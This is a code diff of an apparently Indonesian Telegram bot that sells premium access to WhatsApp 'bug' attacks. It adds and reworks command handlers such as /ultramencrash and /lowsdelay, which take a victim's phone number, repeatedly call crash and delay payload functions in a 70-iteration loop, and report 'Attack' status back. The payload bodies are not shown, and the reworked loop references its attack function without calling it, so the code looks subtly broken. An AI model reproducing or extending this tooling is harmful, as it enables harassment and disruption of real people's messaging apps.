@@ -1038,13 +1038,13 @@ function mainKeyboard() {
   return [
     [
       { text: "⚙️𝐗𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒", callback_data: "xsettings", style: "success" },
-      { text: "🚀𝐗𝐌𝐄𝐍𝐔𝐁𝐔𝐆𝐒", callback_data: "xbugs", style: "danger" }
-    ],
-    [
       { text: "💎𝐓𝐎𝐎𝐋𝐒", callback_data: "tools", style: "success" }
     ],
     [
-      { text: "🎖️𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎" callback_data: "thanks", style: "success" },
+      { text: "🚀𝐗𝐌𝐄𝐍𝐔𝐁𝐔𝐆𝐒", callback_data: "xbugs", style: "danger" }
+    ],
+    [
+      { text: "🎖️𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎", callback_data: "thanks", style: "success" },
       { text: "🌿𝐂𝐇𝐀𝐍𝐄𝐋", url: "https://t.me/AboutMybawz", style: "success" },
     ],
     [
@@ -1095,6 +1095,7 @@ async function sendHome(ctx) {
 ◇ Sender  : ${sender ? "Yes" : "No"}
 ◇ Runtime : ${runtime(process.uptime())}
 ◇ Memory  : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
+◇ Started : ${getStartDate()}
 <blockquote>ֶָ࣪☾. ( ! ) 𝚂𝚎𝚕𝚕𝚎𝚌𝚝 𝚃𝚑𝚎 𝙼𝚎𝚗𝚞 𝙱𝚞𝚝𝚝𝚘𝚗 𝙱𝚎𝚕𝚘𝚠 ࣪ ִֶָ☾.</blockquote>
 `;
 
@@ -1301,7 +1302,7 @@ bot.action("tools", async (ctx) => {
   await editMenu(
     ctx,
     caption,
-    [[{ text: "🔙 BACK MENU", callback_data: "backmenu" }]],
+    [[{ text: "🔙 BACK MENU", callback_data: "backmenu", style: "primary" }]],
     { parse_mode: "HTML" }
   );
 });
@@ -1455,7 +1456,7 @@ bot.command("addadmin", checkOwner, (ctx) => {
   }
 
   addAdmin(userId);
-  ctx.reply(`✅ Berhasil tambah ${userId} jadi admin`);
+  ctx.reply(`✅ Berhasil menambahkan ${userId} menjadi akses admin`);
 });
 
 
@@ -1464,13 +1465,13 @@ bot.command("addprem", checkAdmin, (ctx) => {
   if (!userId) return ctx.reply("Example: /addprem 123");
 
   if (premiumUsers.includes(userId)) {
-    return ctx.reply(`✅ User ${userId} sudah premium.`);
+    return ctx.reply(`✅ User ${userId} sudah menjadi akses premium.`);
   }
 
   premiumUsers.push(userId);
   saveJSON(premiumFile, premiumUsers);
 
-  ctx.reply(`✅ Berhasil tambah ${userId} jadi premium`);
+  ctx.reply(`✅ Berhasil menambahkan ${userId} menjadi akses premium`);
 });
 
 
@@ -2250,7 +2251,7 @@ bot.command("lowsdelay", checkAllPremium, checkWhatsAppConnection, async (ctx) =
 "⬡═―━⊱[ 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐀𝐭𝐭𝐚𝐜𝐤 ]⊰━—═⬡
 ☇ Target: ${q}
 ☇ Status: Succes
-☇ Type: MEDIUM DELAY 
+☇ Type: MEDIUM DELAY CAN SPAM BUGS
 </pre>
 `,
     parse_mode: "HTML",
@@ -2270,56 +2271,34 @@ bot.command("lowsdelay", checkAllPremium, checkWhatsAppConnection, async (ctx) =
   })();
 }); 
 /// --------- ( CASE BUG 6 ) ---------- \\\
-bot.command("ultramencrash", checkAllPremium, checkWhatsAppConnection, async (ctx) => {async (ctx) => {
+bot.command("ultramencrash", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
-  if (!q) return ctx.reply(`🪧 ☇ Format: /ultramencrash 62×××`);
+  if (!q) return ctx.reply(`🪧 Example: /ultramencrash 62xxxx`);
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
-  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
-  let mention = true;
+  await ctx.sendPhoto("https://files.catbox.moe/pm6sti.jpg", {
+    caption: `
+<pre>交 Gxion System Attacks ᝄ
+─ 𝙱𝚞𝚐 𝚜𝚞𝚌𝚌𝚎𝚜 𝚍𝚒𝚔𝚒𝚛𝚒𝚖 𝚔𝚎 𝚝𝚊𝚛𝚐𝚎𝚝,. 𝙶𝚞𝚗𝚊𝚔𝚊𝚗𝚕𝚊𝚑 𝚜𝚎𝚌𝚊𝚛𝚊 𝚋𝚒𝚓𝚊𝚔 𝚍𝚊𝚗 𝚓𝚊𝚗𝚐𝚊𝚗 𝚍𝚒 𝚜𝚊𝚕𝚊𝚑𝚐𝚞𝚗𝚊𝚔𝚊𝚗 ✅
 
-  const processMessage = await ctx.telegram.sendPhoto(
-    ctx.chat.id,
-    { source: "./image/gxion.jpg" }, 
-    {
-      caption: `
-<blockquote><pre>𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐀𝐭𝐭𝐚𝐜𝐤</pre></blockquote>
-⌑ Target : ${q}
-⌑ Type : BLANK ONE MSG
-⌑ Status : Process`,
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [[
-          { text: "𝐂𝐡𝐞𝐜𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}` }
-        ]]
-      }
-    }
-  );
+"⬡═―━⊱[ 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐀𝐭𝐭𝐚𝐜𝐤 ]⊰━—═⬡
+☇ Target: ${q}
+☇ Status: Succes
+☇ Type: BLANK NO SPAM BUGS
+</pre>
+`,
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
+    },
+  });
 
-  const processMessageId = processMessage.message_id;
-
-  for (let i = 0; i < 70; i++) {
+  (async () => {
+    for (let i = 0; i < 70; i++) {
     await VnXBlankAiOneMsg
     await sleep(4000);
-  }
-
-  await ctx.telegram.editMessageCaption(
-    ctx.chat.id,
-    processMessageId,
-    undefined,
-    `
-<blockquote><pre>𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐀𝐭𝐭𝐚𝐜𝐤</pre></blockquote>
-⌑ Target : ${q}
-⌑ Type : BLANK ONE MSG
-⌑ Status : Success`,
-    {
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [[
-          { text: "𝐂𝐡𝐞𝐜𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}` }
-        ]]
-      }
     }
-  );
+  })();
 });
 // ------------ (  FUNCTION BUGS ) -------------- \\
 async function DelayHardNullVnX(sock, target, ptcp = true) {
